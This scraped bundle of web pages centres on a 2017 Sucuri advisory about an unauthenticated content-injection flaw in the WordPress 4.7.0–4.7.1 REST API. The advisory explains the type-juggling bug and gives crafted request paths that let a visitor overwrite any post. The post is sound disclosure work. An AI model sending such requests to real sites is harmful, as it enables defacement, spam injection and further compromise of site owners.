* [WordPress.tv ↗](https://wordpress.tv/)

* [Get Involved](https://make.wordpress.org/)
* [Events](https://events.wordpress.org/)
* [Donate ↗](https://wordpressfoundation.org/donate/)
* [Five for the Future](https://wordpress.org/five-for-the-future/)

* [WordPress.com ↗](https://wordpress.com/?ref=wporg-footer)
* [Matt ↗](https://ma.tt/)
* [bbPress ↗](https://bbpress.org/)
* [BuddyPress ↗](https://buddypress.org/)

[WordPress.org](https://wordpress.org/)

[WordPress.org](https://wordpress.org/)

* [Visit our Facebook page](https://www.facebook.com/WordPress/)
* [Visit our X (formerly Twitter) account](https://www.x.com/WordPress)
* [Visit our Instagram account](https://www.instagram.com/wordpress/)
* [Visit our LinkedIn account](https://www.linkedin.com/company/wordpress)
* [Visit our YouTube channel](https://www.youtube.com/wordpress)

![Code is Poetry](https://s.w.org/style/images/code-is-poetry-for-dark-bg.svg)



=== Content from lists.openwall.net_ae5d8845_20250126_122956.html ===


| [lists.openwall.net](https://lists.openwall.net) [lists](/)  /  [announce](https://www.openwall.com/lists/announce/)  [owl-users](https://www.openwall.com/lists/owl-users/)  [owl-dev](https://www.openwall.com/lists/owl-dev/)  [john-users](https://www.openwall.com/lists/john-users/)  [john-dev](https://www.openwall.com/lists/john-dev/)  [passwdqc-users](https://www.openwall.com/lists/passwdqc-users/)  [yescrypt](https://www.openwall.com/lists/yescrypt/)  [popa3d-users](https://www.openwall.com/lists/popa3d-users/)  /  [oss-security](https://www.openwall.com/lists/oss-security/)  [kernel-hardening](https://www.openwall.com/lists/kernel-hardening/)  [musl](https://www.openwall.com/lists/musl/)  [sabotage](https://www.openwall.com/lists/sabotage/)  [tlsify](https://www.openwall.com/lists/tlsify/)  [passwords](https://www.openwall.com/lists/passwords/)  /  [crypt-dev](https://www.openwall.com/lists/crypt-dev/)  [xvendor](https://www.openwall.com/lists/xvendor/)  /  [Bugtraq](/bugtraq/)  [Full-Disclosure](/full-disclosure/)  [linux-kernel](/linux-kernel/)  linux-[netdev](/netdev/)  [linux-ext4](/linux-ext4/)  [linux-hardening](/linux-hardening/)  [linux-cve-announce](/linux-cve-announce/)  [PHC](/phc-discussions/)| *Open Source and information security mailing list archives*|  | | | | |
| --- | --- | --- | --- | --- |

| | [Hash Suite: Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

# Open Source and information security mailing list archives

### Openwall-hosted community mailing lists

* [oss-security](https://www.openwall.com/lists/oss-security/)
  ([info](https://oss-security.openwall.org/wiki/mailing-lists/oss-security)) -
  Open Source software security discussions
  (there's also a [wiki](https://oss-security.openwall.org/wiki/))* [kernel-hardening](https://www.openwall.com/lists/kernel-hardening/) -
    Linux kernel security hardening discussions (see also linux-hardening below)* [libc-coord](https://www.openwall.com/lists/libc-coord/) -
      [coordination of work on standard C libraries (libc)](https://www.openwall.com/lists/libc-coord/2020/01/30/1)* [musl](https://www.openwall.com/lists/musl/) - discussions around
        [musl](https://www.musl-libc.org),
        a new standard C library for Linux* [passwords](https://www.openwall.com/lists/passwords/) - discussions on anything related to passwords
          except what better fits on other mailing lists* [sabotage](https://www.openwall.com/lists/sabotage/) -
            discussions around Sabotage Linux,
            an experimental distribution based on musl and BusyBox* [tlsify](https://www.openwall.com/lists/tlsify/) - [a TLS API](https://www.openwall.com/lists/tlsify/2015/09/28/1)
              for file-descriptor-oriented applications to make use of secure (TLS) sockets
              without invasive changes to their programming model

### Openwall mailing lists

* [announce](https://www.openwall.com/lists/announce/) - announcements only, very low traffic* [owl-users](https://www.openwall.com/lists/owl-users/) -
    [Openwall GNU/\*/Linux](https://www.openwall.com/Owl/) (Owl) user discussions* [owl-dev](https://www.openwall.com/lists/owl-dev/) - Owl development discussions* [lkrg-users](https://www.openwall.com/lists/lkrg-users/) -
        [Linux Kernel Runtime Guard](https://www.openwall.com/lkrg/) user discussions* [john-users](https://www.openwall.com/lists/john-users/) -
          [John the Ripper](https://www.openwall.com/john/) password cracker user discussions

          See also:
          [selected most useful and currently relevant postings](https://openwall.info/wiki/john/mailing-list-excerpts)* [john-dev](https://www.openwall.com/lists/john-dev/) -
            John the Ripper development discussions* [passwdqc-users](https://www.openwall.com/lists/passwdqc-users/) -
              [passwdqc](https://www.openwall.com/passwdqc/)
              password/passphrase strength checking and policy enforcement toolset user discussions* [yescrypt](https://www.openwall.com/lists/yescrypt/) -
                discussions around [yescrypt](https://www.openwall.com/yescrypt/) KDF and password hashing scheme* [popa3d-users](https://www.openwall.com/lists/popa3d-users/) -
                  [popa3d](https://www.openwall.com/popa3d/) Unix POP3 daemon user discussions

### Obsolete/inactive Openwall(-hosted) mailing lists

* [crypt-dev](https://www.openwall.com/lists/crypt-dev/) -
  [design and implementation of a new password hashing method for servers](https://www.openwall.com/lists/crypt-dev/2011/04/05/2)* [xvendor](https://www.openwall.com/lists/xvendor/)
    ([info](https://www.openwall.com/community/xvendor)) -
    collaboration and information exchange between OS distribution vendors
    (mostly Linux) on non-security topics

### Other (third-party) mailing lists

* [Bugtraq](bugtraq/) -
  security vulnerability announcements and discussions, pre-moderated* [Full-Disclosure](full-disclosure/) -
    security vulnerability announcements and discussions, originally not moderated but now also pre-moderated* [linux-kernel](linux-kernel/) -
      Linux kernel development discussions, very high volume* [netdev](netdev/) -
        Linux networking subsystem development discussions, high volume* [linux-ext4](linux-ext4/) -
          Linux ext4 filesystem development* [linux-hardening](linux-hardening/) -
            Linux kernel security hardening discussions (focused on upstream maintenance of the changes)* [linux-cve-announce](linux-cve-announce/) -
              [Linux kernel CVE announcements](https://docs.kernel.org/process/cve.html)* [PHC discussions](phc-discussions/) -
                [Password Hashing Competition](https://password-hashing.net)
                discussions

Quick Comment:

| [Powered by Openwall GNU/*/Linux](https://www.openwall.com/Owl/ "Powered by Openwall GNU/*/Linux - security-enhanced \"Linux distribution\"") [Powered by OpenVZ](https://openvz.org "Powered by OpenVZ - OS virtualization solution for Linux") 784089 | |
| --- | --- |



=== Content from www.openwall.com_ff0141a7_20250126_122957.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Follow @Openwall on Twitter for new release announcements and other news](https://twitter.com/openwall) | | --- | |
| --- | --- |

# blists - web interface to mailing list archives

blists is a web interface to mailing list archives that works off indexed mbox files.
There are two programs: *bindex* and *bit*.
*bindex* generates or updates the index file (yes, incremental updates are supported).
*bit* is a CGI/SSI program that generates web pages on the fly.
Both programs are written in C and are very fast.

You can view the latest <README> file,
which describes blists in more detail and provides installation instructions.
It is also included in the archive below.

Download ([release notes](/lists/announce/2017/11/19/1)):

* [blists 2.0](blists-2.0.tar.gz) and
  its [signature](blists-2.0.tar.gz.sign)* [blists 1.0](blists-1.0.tar.gz) and
    its [signature](blists-1.0.tar.gz.sign)

These files are also
[available from the Openwall file archive](https://download.openwall.net/pub/projects/blists/).
The source code of blists can be browsed on
[GitHub](https://github.com/openwall/blists) or via
[CVSweb](https://cvsweb.openwall.com/blists).

Follow [this link](/signatures/) for information on verifying the signatures.

To see blists in action, check out our
[Open Source and information security mailing list archives](https://lists.openwall.net).

blists is a registered project with
[Open Hub](https://www.openhub.net/p/blists).

Quick Comment:

413787



=== Content from blog.sucuri.net_f83b6485_20250125_223713.html ===
  [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)
     [![Sucuri Blog](https://blog.sucuri.net/wp-content/uploads/2023/04/Sucuri_Blog_Header_Logo_342x60.png)](https://blog.sucuri.net/)

* Products
  + [Website Security Platform](https://sucuri.net/website-security-platform/)
  + [Website Firewall (WAF)](https://sucuri.net/website-firewall/)
  + [Multi-Site plans](https://sucuri.net/custom/agency/)
  + [Custom & Enterprise Plans](https://sucuri.net/custom/enterprise/)
  + [Partnerships](https://sucuri.net/partners/)
* Features
  + [Detection  Website Monitoring & Alerts](https://sucuri.net/malware-detection-scanning/)
  + [Protection  Future Website Hacks](https://sucuri.net/website-hack-protection/)
  + [Performance  Speed Up Your Website](https://sucuri.net/website-performance/)
  + [Response  Help For Hacked Websites](https://sucuri.net/website-malware-removal/)
  + [Backups  Disaster Recovery Plan](https://sucuri.net/website-backups/)
* Resources
  + [Guides](https://sucuri.net/guides/)
  + [Webinars](https://sucuri.net/webinars/)
  + [Infographics](https://sucuri.net/infographics/)
  + [Blog](/)
  + [SiteCheck](https://sitecheck.sucuri.net/)
  + [Reports](https://sucuri.net/reports/)
  + [Email Courses](https://sucuri.net/email-courses/)
* [Pricing](https://sucuri.net/website-security-platform/signup)
* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
* [Login](https://sucuri.net/website-security-platform/signup/)

* [Immediate Help](https://sucuri.net/website-security-platform/help-now/)
 [Login](https://dashboard.sucuri.net/login/)       [Login](https://dashboard.sucuri.net/login)

New Customer?

[Sign up now.](https://sucuri.net/website-security-platform/signup/)

* [Submit a ticket](https://support.sucuri.net/support/?new)
* [Knowledge base](https://docs.sucuri.net/)
* [Chat now](https://sucuri.net/live-chat/)
 Search for:  Search

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
# Content Injection Vulnerability in WordPress

  [![](https://secure.gravatar.com/avatar/8612a64e0ed5b9e586b548a984073120?s=60&d=mm&r=g)](https://blog.sucuri.net/author/marc)   [Marc-Alexandre Montpas](https://blog.sucuri.net/author/marc)

* February 1, 2017
 ![WordPress Vulnerablity Disclosre](https://blog.sucuri.net/wp-content/uploads/2016/08/wordpress-vulnerability-disclosure-820x386.jpg)

**Security Risk:** Severe

**Exploitation Level:** Easy/Remote

**DREAD Score:** 9/10

**Vulnerability:** Privilege Escalation / Content Injection

**Patched Version:** 4.7.2

As part of a vulnerability research project for our [Sucuri Firewall (WAF)](https://sucuri.net/website-firewall/), we have been auditing multiple open source projects looking for security issues. While working on WordPress, we discovered a **severe content injection**  (privilege escalation) vulnerability affecting the REST API. This vulnerability allows an unauthenticated user to **modify the content of any post or page within a WordPress site.**

We disclosed the vulnerability to the WordPress Security Team who handled it extremely well. They worked closely with us to coordinate the disclosure timeline and get as many hosts and security providers aware and patched before this became public.

A fix for this was silently included on version **4.7.2**  along with other less severe issues. This was done intentionally to give everyone time to patch. We are now disclosing the details because we feel there has been enough time for most WordPress users to update their sites.

## Are You At Risk?

This privilege escalation vulnerability affects the **WordPress REST API** that was recently added and enabled by default on WordPress 4.7.0.

One of these REST endpoints allows access (via the API) to view, edit, delete and create posts. Within this particular endpoint, a subtle bug allows **visitors to edit any post on the site**.

The REST API is enabled by default on all sites using WordPress **4.7.0** or **4.7.1**. If your website is on these versions of WordPress then it is currently vulnerable to this bug.

## Technical Details

Our journey begins in .**/wp-includes/rest-api/endpoints/class-wp-rest-posts-controller.php**

[![](https://blog.sucuri.net/wp-content/uploads/2017/01/wp_1-650x348.png)](https://blog.sucuri.net/wp-content/uploads/2017/01/wp_1.jpg)

There are a couple of things to notice here. The registered route is designed to populate the **ID** request parameter with digits. For example, if you are sending a request to **/wp-json/wp/v2/posts/1234 –** the **ID** parameter would be set to **1234**.

This behavior alone could be a good way to prevent attackers from crafting malicious **ID** values, but when looking at how the REST API manages access, we quickly discover that it prioritizes **$\_GET** and **$\_POST** values over the ones generated by the route’s regular expression. This makes it possible for an attacker to send a request like: **/wp-json/wp/v2/posts/1234?id=12345helloworld**  – which would assign **12345helloworld** to the **ID** parameter – which now contains more than just digits.

Investigating further, we had a look at the various callbacks (in the screenshot above) and one of them kept our attention: the **update\_item** and its permission check method **update\_item\_permissions\_check**.

[![](https://blog.sucuri.net/wp-content/uploads/2017/01/wp2-650x210.png)](https://blog.sucuri.net/wp-content/uploads/2017/01/wp2.jpg)

In short, it passes our alphanumeric **ID** value directly to the **get\_post()** function. This function validates the request by **checking if the post actually exists** and **whether our user has permission to edit this post**. We found this to be a curious way of sanitizing the request. If we send an **ID** that doesn’t have a corresponding post, we can just pass through the permission check and be allowed to continue executing requests to the **update\_item** method!

Curious about what could cause **get\_post()** to fail at finding a post (other than a non-existent **ID**), we realized it used the **get\_instance()** static method in **wp\_posts**to grab posts.

[![](https://blog.sucuri.net/wp-content/uploads/2017/01/wp4-650x87.png)](https://blog.sucuri.net/wp-content/uploads/2017/01/wp4.jpg)

As you can see from the code, it would basically fail on any input that isn’t all made of numeric characters – so **123ABC** would fail.

For an attacker, this means that WordPress (thinking it’s a user with enough privilege to edit this post) would run the **update\_item** method.

We thought it would make sense to check what this method does.

[![](https://blog.sucuri.net/wp-content/uploads/2017/01/wp5-650x273.png)](https://blog.sucuri.net/wp-content/uploads/2017/01/wp5.jpg)

There is a very subtle, yet important detail in that last screenshot – WordPress casts the **ID** parameter to an integer **before passing it to get\_post**!

This is an issue because of the way PHP does type comparisons and conversions. For example, one can see that the following snippet **would return 123**:

[![](https://blog.sucuri.net/wp-content/uploads/2017/01/1111.jpg)](https://blog.sucuri.net/wp-content/uploads/2017/01/1111.jpg)

This leads to a very dangerous situation where an attacker could submit a request like **/wp-json/wp/v2/posts/123?id=456ABC** to **change the post whose ID is 456**!

Due to this [type-juggling](http://php.net/manual/en/language.types.type-juggling.php) issue, it is then possible for an attacker to change the content of **any post or page** on a victim’s site. From there, they can add plugin-specific shortcodes to exploit vulnerabilities (that would otherwise be restricted to contributor roles), infect the site content with an SEO spam campaign, or inject ads, etc.

Depending on the plugins enabled on the site, even PHP code could be executed very easily.

## In Conclusion

If you have not enabled automatic updates on your website, update as soon as possible!

This is a serious vulnerability that can be misused in different ways to compromise a vulnerable site. **Update now!**

Learn more about WP vulnerabilities and how to properly secure your site in our new [WordPress Security Guide.](https://blog.sucuri.net/2017/11/new-wordpress-security-guide.html)

  [![](https://secure.gravatar.com/avatar/8612a64e0ed5b9e586b548a984073120?s=120&d=mm&r=g)](https://blog.sucuri.net/author/marc)
##### [Marc-Alexandre Montpas](https://blog.sucuri.net/author/marc)

Marc-Alexandre Montpas is Sucuri’s Senior Security Analyst who joined the company in 2014. Marc’s main responsibilities include reversing security patches and scavenging vulnerabilities, old and new. His professional experience covers eight years of finding bugs in open-source software. When Marc isn’t breaking things, you might find him participating in a hacking CTF competition. Connect with him on [Twitter](https://twitter.com/marcs0h).

##### Related Categories

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)
##### You May Also Like

 ![Wordfence Evasion Malware Conceals Backdoors](https://blog.sucuri.net/wp-content/uploads/2022/10/BlogPost_Feature-Image_1490x700_Wordfence-Evasion-Malware-Conceals-Backdoors-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Wordfence Evasion Malware Conceals Backdoors](https://blog.sucuri.net/2022/10/wordfence-evasion-malware-conceals-backdoors.html)

* [![](https://secure.gravatar.com/avatar/fcf2c7b3195ff9058d29af3b8a49fc43?s=20&d=mm&r=g)Ben Martin](https://blog.sucuri.net/author/benmartin "View all posts by Ben Martin")
* October 20, 2022
 Malware authors, with some notable exceptions, tend to design their malicious code to hide from sight. The techniques they use help their malware stay on…  [Read the Post](https://blog.sucuri.net/2022/10/wordfence-evasion-malware-conceals-backdoors.html)    ![Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign](https://blog.sucuri.net/wp-content/uploads/2023/04/23-BlogPost_Feature-Image_1490x700_Balada-Injector-390x183.jpg)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Balada Injector: Synopsis of a Massive Ongoing WordPress Malware Campaign](https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* April 6, 2023
 Our team at Sucuri has been tracking a massive WordPress infection campaign since 2017 — but up until recently never bothered to give it a…  [Read the Post](https://blog.sucuri.net/2023/04/balada-injector-synopsis-of-a-massive-ongoing-wordpress-malware-campaign.html)  ![WordPress Vulnerability Detail](https://blog.sucuri.net/wp-content/uploads/2019/03/vulnerability-details-wp_blog-390x183.jpg)

* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Insufficient Privilege Validation in WooCommerce Checkout Manager](https://blog.sucuri.net/2019/04/insufficient-privilege-validation-in-woocommerce-checkout-manager.html)

* [![](https://secure.gravatar.com/avatar/14e8a81f8c7c18715d660025d52ce68a?s=20&d=mm&r=g)John Castro](https://blog.sucuri.net/author/john "View all posts by John Castro")
* April 29, 2019
 Due to the poor handling of a vulnerability disclosure, a new attack vector has appeared for the WooCommerce Checkout Manager WordPress plugin and is affecting…  [Read the Post](https://blog.sucuri.net/2019/04/insufficient-privilege-validation-in-woocommerce-checkout-manager.html)  ![](https://blog.sucuri.net/wp-content/uploads/2017/06/06202017-EN-unwanted-short-st-ads-in-unpathced-newspaper-theme_blog-390x183.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Security Education](https://blog.sucuri.net/category/security-education)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Unwanted “Shorte St” Ads in Unpatched Newspaper Theme](https://blog.sucuri.net/2017/06/unwanted-shorte-st-ads-in-unpatched-newspaper-theme.html)

* [![](https://secure.gravatar.com/avatar/a6437791c9b8a7c6f79c91b3ee027f26?s=20&d=mm&r=g)Fernando Barbosa](https://blog.sucuri.net/author/fernando "View all posts by Fernando Barbosa")
* June 20, 2017
 Unwanted ads are one of the most common problems that site owners ask us to solve. Recently, we’ve noticed quite a few requests to remove…  [Read the Post](https://blog.sucuri.net/2017/06/unwanted-shorte-st-ads-in-unpatched-newspaper-theme.html)  ![Sucuri October 2024 Vulnerability Roundup](https://blog.sucuri.net/wp-content/uploads/2024/11/October-2024-390x183.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Security Education](https://blog.sucuri.net/category/security-education)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPress Vulnerability & Patch Roundup October 2024](https://blog.sucuri.net/2024/11/wordpress-vulnerability-patch-roundup-october-2024.html)

* [![](https://blog.sucuri.net/wp-content/uploads/2024/07/avatar_user_112_1721420180-20x20.png)Sucuri Malware Research Team](https://blog.sucuri.net/author/malware-research "View all posts by Sucuri Malware Research Team")
* November 1, 2024
 Vulnerability reports and responsible disclosures are essential for website security awareness and education. Automated attacks targeting known software vulnerabilities are one of the leading causes…  [Read the Post](https://blog.sucuri.net/2024/11/wordpress-vulnerability-patch-roundup-october-2024.html)  ![December 2023 Vulnerability Patch Roundup](https://blog.sucuri.net/wp-content/uploads/2023/01/23-BlogPost_Feature-Image_1490x700_January-Vulnerability-Round-Up-390x183.jpg)

* [Security Advisory](https://blog.sucuri.net/category/security-advisory)
* [Vulnerability Disclosure](https://blog.sucuri.net/category/vulnerability-disclosure)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [WordPress Vulnerability & Patch Roundup January 2023](https://blog.sucuri.net/2023/01/wordpress-vulnerability-patch-roundup-january-2023.html)

* [![](https://secure.gravatar.com/avatar/814d8a855f60f285a7501fd7d0b13e17?s=20&d=mm&r=g)Cesar Anjos](https://blog.sucuri.net/author/cesarsucuri-net "View all posts by Cesar Anjos")
* January 30, 2023
 Vulnerability reports and responsible disclosures are essential for website security awareness and education. Automated attacks targeting known software vulnerabilities are one of the leading causes…  [Read the Post](https://blog.sucuri.net/2023/01/wordpress-vulnerability-patch-roundup-january-2023.html)    ![New Xjquery Wave of WordPress SocGholish Injections](https://blog.sucuri.net/wp-content/uploads/2023/05/23-BlogPost_Feature-Image_1490x700_Xjquery-wave-of-WordPress-SocGholish-Injections-390x183.jpg)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [Website Security](https://blog.sucuri.net/category/website-security)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Xjquery Wave of WordPress SocGholish Injections](https://blog.sucuri.net/2023/05/xjquery-wave-of-wordpress-socgholish-injections.html)

* [![](https://secure.gravatar.com/avatar/c9ef50b85bd345ea4e0d8da558816f3d?s=20&d=mm&r=g)Denis Sinegubko](https://blog.sucuri.net/author/denis "View all posts by Denis Sinegubko")
* May 9, 2023
 In November, 2022, my colleague Ben Martin described how hackers were using zipped files and encrypted WordPress options stored in the database to inject SocGholish…  [Read the Post](https://blog.sucuri.net/2023/05/xjquery-wave-of-wordpress-socgholish-injections.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Evil Self-Regenerating WordPress Administrator User](https://blog.sucuri.net/2017/09/evil-self-regenerating-wordpress-administrator-user.html)

* [![](https://secure.gravatar.com/avatar/?s=20&d=mm&r=g)Andrey Kucherov](https://blog.sucuri.net/author/andrey-kucherov "View all posts by Andrey Kucherov")
* September 1, 2017
 Attackers often aim to conceal their presence using different methods, such as injecting redirect scripts, creating spam pages, or hiding a mailer in checkout pages…  [Read the Post](https://blog.sucuri.net/2017/09/evil-self-regenerating-wordpress-administrator-user.html)  ![Labs Note](https://blog.sucuri.net/wp-content/uploads/2020/07/sucuri-labs-og1-390x181.png)

* [Sucuri Labs](https://blog.sucuri.net/category/sucuri-labs)
* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Simple self updating hacktool](https://blog.sucuri.net/2017/09/simple-self-updating-hacktool.html)

* [![](https://secure.gravatar.com/avatar/2cc3d9e604665f78d321d5fbf710eb35?s=20&d=mm&r=g)Pedro Peixoto](https://blog.sucuri.net/author/pedro "View all posts by Pedro Peixoto")
* September 26, 2017
 While working on a compromised website, it’s very common to encounter hacktools. Those are like the attackers’ swiss knife, allowing them to perform several tasks…  [Read the Post](https://blog.sucuri.net/2017/09/simple-self-updating-hacktool.html)    ![Malicious Script Injection on WordPress Sites](https://blog.sucuri.net/wp-content/uploads/2024/12/Malicious-Script-Injection-on-WordPress-Sites-390x183.png)

* [Website Malware Infections](https://blog.sucuri.net/category/website-malware-infections)
* [WordPress Security](https://blog.sucuri.net/category/wordpress-security)

## [Malicious Script Injection on WordPress Sites](https://blog.sucuri.net/2024/12/malicious-script-injection-on-wordpress-sites.html)

* [![](https://secure.gravatar.com/avatar/846b8deebaa5f89a647dfbee5ef32a5e?s=20&d=mm&r=g)Puja Srivastava](https://blog.sucuri.net/author/puja-srivastava "View all posts by Puja Srivastava")
* December 5, 2024
 Recently, our team discovered a JavaScript-based malware affecting WordPress sites, primarily targeting those using the Hello Elementor theme. This type of malware is commonly embedded…  [Read the Post](https://blog.sucuri.net/2024/12/malicious-script-injection-on-wordpress-sites.html)
##### Search

 Search for:  Search[![WordPress Security Guide Sidebar](https://blog.sucuri.net/wp-content/uploads/2024/02/WordPress-Security-Guide-Sidebar.jpg)](https://sucuri.net/guides/wordpress-security/)[![](https://blog.sucuri.net/wp-content/uploads/2023/04/23-sucuri-newsletter-blog-banner.png)](https://info.sucuri.net/subscribe-to-security)[![Sucuri Sidebar Malware Removal to Signup Page](https://blog.sucuri.net/wp-content/uploads/2023/08/23-sucuri-blog-sidebar-banner-need-help-cleaning-up-malware-on-your-website-get-help-now-new.png)](https://sucuri.net/website-security-platform/signup/) ![Sucuri Logo](https://sucuri.net/wp-content/uploads/2022/12/sucuri_logo_dark.svg)

Let’s Connect

        [Products](https://sucuri.net/website-security/)   [Website Firewall](https://sucuri.net/website-firewall/)   [Website Security Platform](https://sucuri.net/website-security-platform/)   [WordPress Security](https://sucuri.net/wordpress-security/)   [Website Backups](https://sucuri.net/website-backups/)   [Hack Assistance](https://sucuri.net/website-security-platform/help-now/)   [Pricing](https://sucuri.net/website-security-platform/signup)   [Solutions](https://sucuri.net/ddos-protection/)   [DDoS Protection](https://sucuri.net/ddos-protection/)   [Malware Detection](https://sucuri.net/malware-detection-scanning/)   [Malware Removal](https://sucuri.net/website-malware-removal/)   [Malware Prevention](https://sucuri.net/website-hack-protection/)   [Blacklist Removal](https://sucuri.net/website-security-platform/blocklist-removal-and-repair/)   [SEO Spam Removal](https://sucuri.net/seo-spam-removal/)  USE CASES  [Developers](https://sucuri.net/developers/)   [Ecommerce](https://sucuri.net/ecommerce-website-security/)   [Agency Plans](https://sucuri.net/custom/agency/)   [Enterprise Services](https://sucuri.net/custom/agency/)   [HTTPS/2](https://sucuri.net/http-2-rapid-reset/)   [Virtual Patching](https://sucuri.net/virtual-patching/)   [Support](https://docs.sucuri.net/)   [Knowledge Base](https://docs.sucuri.net/)   [SiteCheck](https://sitecheck.sucuri.net/)   [Guides](https://sucuri.net/guides/)   [Research Labs](https://labs.sucuri.net/)   [Report Abuse](https://abuse.sucuri.net/)   [Status Report](https://status.sucuri.net/)   [Company](https://sucuri.net/company/)   [About Sucuri](https://sucuri.net/company/)   [Contact](https://sucuri.net/company/contact-us/)   [Blog](https://blog.sucuri.net/)   [Referral](https://sucuri.net/referral/)   [Partners](https://sucuri.net/partners/)   [Testimonials](https://sucuri.net/customers/)  [Terms of Use](https://sucuri.net/terms/) [Privacy Policy](https://sucuri.net/privacy/) [Do Not Sell My Personal Information](https://sucuri.net/cookies/) [Frequently Asked Questions](https://sucuri.net/faq/)

© 2025 GoDaddy Mediatemple, Inc., d/b/a Sucuri. All rights reserved.

   [back to top](#top "Going Top")  X

Sucuri Cookie Policy
 [See our policy>>](https://sucuri.net/cookies)

Our website uses cookies, which help us to improve our site and enables us to deliver the best possible service and customer experience.

 Accept Decline Manage Options

=== Content from make.wordpress.org_92ad3ff3_20250125_223723.html ===

[Skip to content](#primary)

* [Log In](https://login.wordpress.org/?redirect_to=https%3A%2F%2Fmake.wordpress.org%2Fcore%2F2017%2F02%2F01%2Fdisclosure-of-additional-security-fix-in-wordpress-4-7-2%2F&locale=en_US)
* [Register](https://login.wordpress.org/register?locale=en_US)

[WordPress.org](https://wordpress.org/)

* [News](https://wordpress.org/news/)
* [Showcase](https://wordpress.org/showcase/)
* [Hosting](https://wordpress.org/hosting/)
* Extend
  + [Themes](https://wordpress.org/themes/)
  + [Plugins](https://wordpress.org/plugins/)
  + [Patterns](https://wordpress.org/patterns/)
  + [Blocks](https://wordpress.org/blocks/)
  + [Openverse ↗︎](https://openverse.org/)
* Learn
  + [Learn WordPress](https://learn.wordpress.org/)
  + [Documentation](https://wordpress.org/documentation/)
  + [Forums](https://wordpress.org/support/forums/)
  + [Developers](https://developer.wordpress.org/)
  + [WordPress.tv ↗︎](https://wordpress.tv/)
* Community
  + [Make WordPress](https://make.wordpress.org/)
